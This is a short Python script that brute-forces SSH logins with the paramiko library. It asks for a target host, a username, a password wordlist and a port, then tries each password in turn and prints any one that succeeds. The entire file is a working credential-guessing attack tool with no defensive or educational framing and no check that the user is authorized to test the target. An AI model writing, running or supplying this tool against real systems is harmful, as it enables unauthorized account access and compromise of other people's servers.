import paramiko , sys , os , socket , termcolor
from paramiko.client import SSHClient 
print("Created by Aleska Tamburkovski but edited by bruhvinnie")
host = input("[+] Target Address:")
username = input("[+] SSH Username:")
file = input('[+] Wordlist:')
port = input("[+] SSH port:")
# the part of the program that connects to the ssh client
def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code 
if os.path.exists(file) == False:
    print("[-] File cannot be found")
    exit(1)

with open(file,'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(("[+] Found password:" + password + ' For user ' + username),'green'))
                break
            elif response == 1:
                print("[-] Unable to login")
            elif response == 2:
                print("[-] Unable to connect")
                exit(1)
        except Exception as e:
            print(e)
            pass